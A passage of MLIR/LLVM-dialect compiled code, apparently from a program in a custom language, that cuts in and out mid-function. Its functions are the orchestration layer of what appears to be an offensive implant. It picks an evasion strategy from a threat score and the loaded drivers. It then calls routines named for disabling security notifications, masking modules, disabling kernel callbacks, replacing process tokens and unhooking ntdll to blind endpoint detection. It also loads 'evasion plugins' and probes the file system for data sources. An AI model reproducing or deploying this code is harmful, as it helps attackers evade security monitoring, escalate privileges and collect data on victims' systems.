    llvm.call @println(%25) : (!llvm.ptr) -> ()
    %26 = llvm.getelementptr %5[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%26) : (!llvm.ptr) -> ()
    %27 = llvm.getelementptr %6[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<17 x i8>
    %28 = llvm.load %3 {alignment = 8 : i64} : !llvm.ptr -> f64
    %29 = llvm.fptosi %28 : f64 to i64
    %30 = llvm.call @string(%29) : (i64) -> !llvm.ptr
    %31 = llvm.call @jocky_str_concat(%27, %30) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%31) : (!llvm.ptr) -> ()
    %32 = llvm.load %3 {alignment = 8 : i64} : !llvm.ptr -> f64
    %33 = llvm.fcmp "ogt" %32, %7 : f64
    llvm.cond_br %33, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %34 = llvm.getelementptr %16[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<23 x i8>
    llvm.call @println(%34) : (!llvm.ptr) -> ()
    %35 = llvm.getelementptr %10[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %36 = llvm.getelementptr %11[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %37 = llvm.getelementptr %12[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %38 = llvm.load %3 {alignment = 8 : i64} : !llvm.ptr -> f64
    %39 = llvm.fptosi %38 : f64 to i64
    %40 = llvm.call @string(%39) : (i64) -> !llvm.ptr
    %41 = llvm.call @jocky_str_concat(%37, %40) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %42 = llvm.getelementptr %17[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    llvm.call @log_operation(%35, %36, %41, %42) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb6
  ^bb2:  // pred: ^bb0
    %43 = llvm.load %3 {alignment = 8 : i64} : !llvm.ptr -> f64
    %44 = llvm.fcmp "ogt" %43, %8 : f64
    llvm.cond_br %44, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %45 = llvm.getelementptr %14[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<21 x i8>
    llvm.call @println(%45) : (!llvm.ptr) -> ()
    %46 = llvm.getelementptr %10[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %47 = llvm.getelementptr %11[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %48 = llvm.getelementptr %12[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %49 = llvm.load %3 {alignment = 8 : i64} : !llvm.ptr -> f64
    %50 = llvm.fptosi %49 : f64 to i64
    %51 = llvm.call @string(%50) : (i64) -> !llvm.ptr
    %52 = llvm.call @jocky_str_concat(%48, %51) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %53 = llvm.getelementptr %15[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    llvm.call @log_operation(%46, %47, %52, %53) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb5
  ^bb4:  // pred: ^bb2
    %54 = llvm.getelementptr %9[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    llvm.call @println(%54) : (!llvm.ptr) -> ()
    %55 = llvm.getelementptr %10[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    %56 = llvm.getelementptr %11[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<11 x i8>
    %57 = llvm.getelementptr %12[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %58 = llvm.load %3 {alignment = 8 : i64} : !llvm.ptr -> f64
    %59 = llvm.fptosi %58 : f64 to i64
    %60 = llvm.call @string(%59) : (i64) -> !llvm.ptr
    %61 = llvm.call @jocky_str_concat(%57, %60) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %62 = llvm.getelementptr %13[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<4 x i8>
    llvm.call @log_operation(%55, %56, %61, %62) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb5
  ^bb5:  // 2 preds: ^bb3, ^bb4
    llvm.br ^bb6
  ^bb6:  // 2 preds: ^bb1, ^bb5
    %63 = llvm.getelementptr %5[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%63) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @select_and_activate_strategy() {
    %0 = llvm.mlir.addressof @".str.53" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.54" : !llvm.ptr
    %3 = llvm.mlir.constant(1 : i32) : i32
    %4 = llvm.mlir.addressof @loaded_drivers : !llvm.ptr
    %5 = llvm.mlir.addressof @threat_score : !llvm.ptr
    %6 = llvm.mlir.constant(8.000000e-01 : f64) : f64
    %7 = llvm.mlir.constant(5.000000e-01 : f64) : f64
    %8 = llvm.mlir.addressof @".str.70" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.71" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.65" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.69" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.67" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.68" : !llvm.ptr
    %14 = llvm.mlir.constant(2 : i32) : i32
    %15 = llvm.mlir.addressof @".str.55" : !llvm.ptr
    %16 = llvm.mlir.constant(0.69999999999999996 : f64) : f64
    %17 = llvm.mlir.addressof @".str.66" : !llvm.ptr
    %18 = llvm.mlir.constant(3 : i32) : i32
    %19 = llvm.mlir.addressof @".str.56" : !llvm.ptr
    %20 = llvm.mlir.addressof @".str.57" : !llvm.ptr
    %21 = llvm.mlir.constant(4 : i32) : i32
    %22 = llvm.mlir.addressof @".str.58" : !llvm.ptr
    %23 = llvm.mlir.addressof @".str.59" : !llvm.ptr
    %24 = llvm.mlir.addressof @".str.60" : !llvm.ptr
    %25 = llvm.mlir.addressof @".str.61" : !llvm.ptr
    %26 = llvm.mlir.addressof @".str.62" : !llvm.ptr
    %27 = llvm.mlir.addressof @".str.63" : !llvm.ptr
    %28 = llvm.mlir.addressof @".str.64" : !llvm.ptr
    %29 = llvm.mlir.addressof @".str.72" : !llvm.ptr
    %30 = llvm.mlir.addressof @".str.73" : !llvm.ptr
    %31 = llvm.mlir.addressof @".str.74" : !llvm.ptr
    %32 = llvm.mlir.addressof @".str.75" : !llvm.ptr
    %33 = llvm.mlir.addressof @".str.1" : !llvm.ptr
    %34 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<34 x i8>
    llvm.call @println(%34) : (!llvm.ptr) -> ()
    %35 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    %36 = llvm.alloca %3 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %35, %36 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %37 = llvm.alloca %3 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    llvm.store %1, %37 {alignment = 4 : i64} : i32, !llvm.ptr
    %38 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %39 = llvm.call @array_len(%38) : (!llvm.ptr) -> i64
    %40 = llvm.sext %1 : i32 to i64
    %41 = llvm.icmp "sgt" %39, %40 : i64
    llvm.cond_br %41, ^bb1, ^bb5
  ^bb1:  // pred: ^bb0
    %42 = llvm.getelementptr %15[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<42 x i8>
    %43 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %44 = llvm.getelementptr %43[%1] : (!llvm.ptr, i32) -> !llvm.ptr, !llvm.ptr
    %45 = llvm.load %44 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %46 = llvm.call @jocky_str_concat(%42, %45) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%46) : (!llvm.ptr) -> ()
    %47 = llvm.load %5 {alignment = 8 : i64} : !llvm.ptr -> f64
    %48 = llvm.fcmp "ogt" %47, %16 : f64
    llvm.cond_br %48, ^bb2, ^bb3
  ^bb2:  // pred: ^bb1
    %49 = llvm.getelementptr %19[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<43 x i8>
    llvm.call @println(%49) : (!llvm.ptr) -> ()
    %50 = llvm.getelementptr %20[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    llvm.store %50, %36 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    llvm.store %21, %37 {alignment = 4 : i64} : i32, !llvm.ptr
    %51 = llvm.mlir.addressof @btr_disable_notifications : !llvm.ptr
    %52 = llvm.call %51() : !llvm.ptr, () -> i1
    %53 = llvm.getelementptr %22[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %54 = llvm.mlir.addressof @btr_mask_module : !llvm.ptr
    %55 = llvm.call %54(%53) : !llvm.ptr, (!llvm.ptr) -> i1
    %56 = llvm.getelementptr %23[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<13 x i8>
    %57 = llvm.mlir.addressof @btr_mask_module : !llvm.ptr
    %58 = llvm.call %57(%56) : !llvm.ptr, (!llvm.ptr) -> i1
    %59 = llvm.getelementptr %24[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
    llvm.call @println(%59) : (!llvm.ptr) -> ()
    %60 = llvm.mlir.addressof @jocky_exploit_disable_callbacks : !llvm.ptr
    %61 = llvm.call %60() : !llvm.ptr, () -> i32
    %62 = llvm.mlir.addressof @jocky_exploit_token_replacement : !llvm.ptr
    %63 = llvm.call %62(%1, %1) : !llvm.ptr, (i32, i32) -> i32
    %64 = llvm.getelementptr %25[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<15 x i8>
    %65 = llvm.getelementptr %26[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<19 x i8>
    %66 = llvm.getelementptr %27[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<14 x i8>
    %67 = llvm.getelementptr %28[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    llvm.call @log_operation(%64, %65, %66, %67) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb4
  ^bb3:  // pred: ^bb1
    %68 = llvm.getelementptr %10[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<32 x i8>
    llvm.call @println(%68) : (!llvm.ptr) -> ()
    %69 = llvm.getelementptr %17[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<14 x i8>
    llvm.store %69, %36 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    llvm.store %18, %37 {alignment = 4 : i64} : i32, !llvm.ptr
    %70 = llvm.mlir.addressof @btr_disable_notifications : !llvm.ptr
    %71 = llvm.call %70() : !llvm.ptr, () -> i1
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    llvm.br ^bb12
  ^bb5:  // pred: ^bb0
    %72 = llvm.load %5 {alignment = 8 : i64} : !llvm.ptr -> f64
    %73 = llvm.fcmp "ogt" %72, %6 : f64
    llvm.cond_br %73, ^bb6, ^bb7
  ^bb6:  // pred: ^bb5
    %74 = llvm.getelementptr %12[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<45 x i8>
    llvm.call @println(%74) : (!llvm.ptr) -> ()
    %75 = llvm.getelementptr %13[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<20 x i8>
    llvm.store %75, %36 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    llvm.store %14, %37 {alignment = 4 : i64} : i32, !llvm.ptr
    %76 = llvm.mlir.addressof @edrhoker_detect : !llvm.ptr
    %77 = llvm.call %76() : !llvm.ptr, () -> i1
    %78 = llvm.mlir.addressof @blindside_unhook_ntdll : !llvm.ptr
    %79 = llvm.call %78() : !llvm.ptr, () -> i1
    llvm.br ^bb11
  ^bb7:  // pred: ^bb5
    %80 = llvm.load %5 {alignment = 8 : i64} : !llvm.ptr -> f64
    %81 = llvm.fcmp "ogt" %80, %7 : f64
    llvm.cond_br %81, ^bb8, ^bb9
  ^bb8:  // pred: ^bb7
    %82 = llvm.getelementptr %10[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<32 x i8>
    llvm.call @println(%82) : (!llvm.ptr) -> ()
    %83 = llvm.getelementptr %11[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<16 x i8>
    llvm.store %83, %36 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    llvm.store %3, %37 {alignment = 4 : i64} : i32, !llvm.ptr
    llvm.br ^bb10
  ^bb9:  // pred: ^bb7
    %84 = llvm.getelementptr %8[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<33 x i8>
    llvm.call @println(%84) : (!llvm.ptr) -> ()
    %85 = llvm.getelementptr %9[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    llvm.store %85, %36 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    llvm.store %1, %37 {alignment = 4 : i64} : i32, !llvm.ptr
    llvm.br ^bb10
  ^bb10:  // 2 preds: ^bb8, ^bb9
    llvm.br ^bb11
  ^bb11:  // 2 preds: ^bb6, ^bb10
    llvm.br ^bb12
  ^bb12:  // 2 preds: ^bb4, ^bb11
    %86 = llvm.getelementptr %29[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<13 x i8>
    %87 = llvm.load %36 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %88 = llvm.call @jocky_str_concat(%86, %87) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%88) : (!llvm.ptr) -> ()
    %89 = llvm.getelementptr %30[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<17 x i8>
    %90 = llvm.getelementptr %31[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    %91 = llvm.load %36 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %92 = llvm.getelementptr %32[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    llvm.call @log_operation(%89, %90, %91, %92) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    %93 = llvm.getelementptr %33[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%93) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @load_evasion_plugins() {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.76" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.77" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.78" : !llvm.ptr
    %5 = llvm.mlir.constant(0 : i64) : i64
    %6 = llvm.mlir.addressof @".str.83" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.1" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.79" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.80" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.81" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.82" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.75" : !llvm.ptr
    %13 = llvm.mlir.constant(1 : i64) : i64
    %14 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %15 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %16 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<31 x i8>
    llvm.call @println(%16) : (!llvm.ptr) -> ()
    %17 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    %18 = llvm.alloca %0 x !llvm.array<2 x ptr> {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %19 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<2 x ptr>
    llvm.store %17, %19 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %20 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<26 x i8>
    %21 = llvm.getelementptr %18[%2, %0] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<2 x ptr>
    llvm.store %20, %21 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %22 = llvm.bitcast %18 : !llvm.ptr to !llvm.ptr
    llvm.store %22, %14 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %23 = llvm.alloca %0 x i32 {alignment = 4 : i64} : (i32) -> !llvm.ptr
    llvm.store %2, %23 {alignment = 4 : i64} : i32, !llvm.ptr
    %24 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %25 = llvm.call @array_len(%24) : (!llvm.ptr) -> i64
    %26 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %5, %26 {alignment = 4 : i64} : i64, !llvm.ptr
    %27 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.br ^bb1
  ^bb1:  // 2 preds: ^bb0, ^bb5
    %28 = llvm.load %26 {alignment = 4 : i64} : !llvm.ptr -> i64
    %29 = llvm.icmp "slt" %28, %25 : i64
    llvm.cond_br %29, ^bb2, ^bb6
  ^bb2:  // pred: ^bb1
    %30 = llvm.bitcast %24 : !llvm.ptr to !llvm.ptr
    %31 = llvm.getelementptr %30[%28] : (!llvm.ptr, i64) -> !llvm.ptr, !llvm.ptr
    %32 = llvm.load %31 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %32, %27 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %33 = llvm.load %27 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %34 = llvm.call @plugin_load(%33) : (!llvm.ptr) -> i64
    llvm.store %34, %15 {alignment = 4 : i64} : i64, !llvm.ptr
    %35 = llvm.load %15 {alignment = 4 : i64} : !llvm.ptr -> i64
    %36 = llvm.sext %2 : i32 to i64
    %37 = llvm.icmp "sgt" %35, %36 : i64
    llvm.cond_br %37, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %38 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<15 x i8>
    %39 = llvm.load %27 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %40 = llvm.call @jocky_str_concat(%38, %39) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%40) : (!llvm.ptr) -> ()
    %41 = llvm.load %15 {alignment = 4 : i64} : !llvm.ptr -> i64
    %42 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<17 x i8>
    llvm.call @plugin_run(%41, %42) : (i64, !llvm.ptr) -> ()
    %43 = llvm.load %23 {alignment = 4 : i64} : !llvm.ptr -> i32
    %44 = llvm.add %43, %0 : i32
    llvm.store %44, %23 {alignment = 4 : i64} : i32, !llvm.ptr
    %45 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %46 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %47 = llvm.load %27 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %48 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    llvm.call @log_operation(%45, %46, %47, %48) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    llvm.br ^bb5
  ^bb5:  // pred: ^bb4
    %49 = llvm.add %28, %13 : i64
    llvm.store %49, %26 {alignment = 4 : i64} : i64, !llvm.ptr
    llvm.br ^bb1
  ^bb6:  // pred: ^bb1
    %50 = llvm.load %23 {alignment = 4 : i64} : !llvm.ptr -> i32
    %51 = llvm.icmp "eq" %50, %2 : i32
    llvm.cond_br %51, ^bb7, ^bb8
  ^bb7:  // pred: ^bb6
    %52 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<38 x i8>
    llvm.call @println(%52) : (!llvm.ptr) -> ()
    llvm.br ^bb8
  ^bb8:  // 2 preds: ^bb6, ^bb7
    %53 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.call @println(%53) : (!llvm.ptr) -> ()
    llvm.return
  }
  llvm.func @discover_data_sources() -> !llvm.ptr {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.84" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.85" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.86" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.87" : !llvm.ptr
    %6 = llvm.mlir.constant(2 : i32) : i32
    %7 = llvm.mlir.addressof @".str.88" : !llvm.ptr
    %8 = llvm.mlir.constant(3 : i32) : i32
    %9 = llvm.mlir.addressof @".str.89" : !llvm.ptr
    %10 = llvm.mlir.constant(4 : i32) : i32
    %11 = llvm.mlir.addressof @".str.90" : !llvm.ptr
    %12 = llvm.mlir.constant(5 : i32) : i32
    %13 = llvm.mlir.zero : !llvm.ptr
    %14 = llvm.mlir.constant(0 : i64) : i64
    %15 = llvm.mlir.addressof @".str.94" : !llvm.ptr
    %16 = llvm.mlir.addressof @".str.95" : !llvm.ptr
    %17 = llvm.mlir.addressof @".str.1" : !llvm.ptr
    %18 = llvm.mlir.addressof @".str.91" : !llvm.ptr
    %19 = llvm.mlir.addressof @".str.92" : !llvm.ptr
    %20 = llvm.mlir.addressof @".str.93" : !llvm.ptr
    %21 = llvm.mlir.constant(1 : i64) : i64
    %22 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %23 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<32 x i8>
    llvm.call @println(%23) : (!llvm.ptr) -> ()
    %24 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %25 = llvm.alloca %0 x !llvm.array<6 x ptr> {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %26 = llvm.getelementptr %25[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x ptr>
    llvm.store %24, %26 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %27 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
    %28 = llvm.getelementptr %25[%2, %0] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x ptr>
    llvm.store %27, %28 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %29 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %30 = llvm.getelementptr %25[%2, %6] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x ptr>
    llvm.store %29, %30 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %31 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %32 = llvm.getelementptr %25[%2, %8] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x ptr>
    llvm.store %31, %32 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %33 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<9 x i8>
    %34 = llvm.getelementptr %25[%2, %10] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x ptr>
    llvm.store %33, %34 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %35 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %36 = llvm.getelementptr %25[%2, %12] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<6 x ptr>
    llvm.store %35, %36 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %37 = llvm.bitcast %25 : !llvm.ptr to !llvm.ptr
    llvm.store %37, %22 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %38 = llvm.bitcast %13 : !llvm.ptr to !llvm.ptr
    %39 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %38, %39 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %40 = llvm.load %22 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %41 = llvm.call @array_len(%40) : (!llvm.ptr) -> i64
    %42 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %14, %42 {alignment = 4 : i64} : i64, !llvm.ptr
    %43 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.br ^bb1
  ^bb1:  // 2 preds: ^bb0, ^bb5
    %44 = llvm.load %42 {alignment = 4 : i64} : !llvm.ptr -> i64
    %45 = llvm.icmp "slt" %44, %41 : i64
    llvm.cond_br %45, ^bb2, ^bb6
  ^bb2:  // pred: ^bb1
    %46 = llvm.bitcast %40 : !llvm.ptr to !llvm.ptr
    %47 = llvm.getelementptr %46[%44] : (!llvm.ptr, i64) -> !llvm.ptr, !llvm.ptr
    %48 = llvm.load %47 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    llvm.store %48, %43 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %49 = llvm.load %43 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %50 = llvm.call @fs_exists(%49) : (!llvm.ptr) -> i1
    llvm.cond_br %50, ^bb3, ^bb4
  ^bb3:  // pred: ^bb2
    %51 = llvm.load %39 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %52 = llvm.load %43 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %53 = llvm.call @array_append(%51, %52) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %54 = llvm.bitcast %53 : !llvm.ptr to !llvm.ptr
    llvm.store %54, %39 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %55 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<10 x i8>
    %56 = llvm.getelementptr %19[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<13 x i8>
    %57 = llvm.load %43 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %58 = llvm.getelementptr %20[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<8 x i8>
    llvm.call @log_operation(%55, %56, %57, %58) : (!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> ()
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb2, ^bb3
    llvm.br ^bb5
  ^bb5:  // pred: ^bb4
    %59 = llvm.add %44, %21 : i64
    llvm.store %59, %42 {alignment = 4 : i64} : i64, !llvm.ptr
    llvm.br ^bb1
  ^bb6:  // pred: ^bb1
    %60 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<13 x i8>
    %61 = llvm.load %39 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %62 = llvm.call @array_len(%61) : (!llvm.ptr) -> i64
    %63 = llvm.call @string(%62) : (i64) -> !llvm.ptr
    %64 = llvm.call @jocky_str_concat(%60, %63) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %65 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<14 x i8>
    %66 = llvm.call @jocky_str_concat(%64, %65) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
